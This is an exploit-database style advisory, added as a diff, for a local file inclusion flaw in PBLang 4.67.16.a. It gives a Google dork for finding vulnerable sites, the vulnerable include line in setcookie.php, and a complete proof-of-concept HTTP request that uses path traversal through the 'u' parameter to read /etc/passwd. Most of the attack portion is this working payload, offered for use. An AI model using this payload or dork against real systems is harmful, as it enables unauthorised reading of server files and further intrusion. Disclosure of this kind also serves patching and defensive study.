@@ -1,0 +1,35 @@
+||\\      || ||       || |-\\          //-|  ____      ________           __________  
+|| \\     || ||       || | |\\        //| | |     \   |  ______|         |_______/ /
+||  \\    || ||       || | | \\      // | | |  _   \  | |                       / /
+||   \\   || ||       || | |  \\    //  | | | |_)  |  | |______    /\`'__\     / /
+||    \\  || ||       || | |   \\  //   | | |  _  <   |  ______|   \ \ \/     / /
+||     \\ || ||_______|| | |    \\//    | | | |_)  |  | |______     \ \_\    / /
+||      \\|| |_________| |_|            |_| |_____/   |________|     \/_/   /_/
+______________________________________________________________________________________
+# Exploit Title:  [PBLang local file include vulnerability]
+# Google Dork:    ["Software PBLang 4.67.16.a"]
+# Date:           [12/03/2012]
+# Author:         ~Pseudo:  [Number 7];
+                  ~ Twitter:[@TunisianSeven];
+                  ~ Blog:   [http://tunisianseven.blogspot.com/]
+# Software Link:  [http://garr.dl.sourceforge.net/project/pblang/Full%20versions/PBLang%204.67.16.a%20no%20graphics/PBLang-4.67.16.a-nographics.zip]
+# Version:        [4.67.16.a]
+# Tested on:      [wINDOWS,Linux]
+______________________________________________________________________________________
+Proof of concept:
+In setcookie.php
+include($dbpath."/members/".$u);
+
+In order to successfully perform this attack the attacker must have
+the full path where the files are uploaded, and it is easy to get
+making a request like this:
+
+GET http://localhost/path/setcookie.php?u=../../../../../etc/passwd HTTP/1.1
+Cookie: eXtplorer=eRlQPZSWiGt2zRpFlXr6qCgja6DiLumU
+Host: localhost:80
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+For requests like this i use acunetix :D
+______________________________________________________________________________________
